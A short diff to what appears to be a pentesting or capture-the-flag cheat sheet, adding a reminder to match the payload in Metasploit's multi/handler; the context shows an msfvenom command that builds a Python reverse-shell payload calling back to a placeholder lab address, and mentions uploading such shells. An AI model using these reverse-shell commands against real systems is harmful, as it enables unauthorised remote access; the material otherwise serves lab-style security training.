@@ -107,7 +107,9 @@ For SQL injection focused task either perform the injection manually or use sqlm
 
  ```msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py``` - Python.
 
- Refer to "Transfering Files" section in order to see details how to upload these shells.
+Remember to set correct payload in the exploit/multi/handler as well!
+ 
+Refer to "Transfering Files" section in order to see details how to upload these shells.
 
 </details>
 
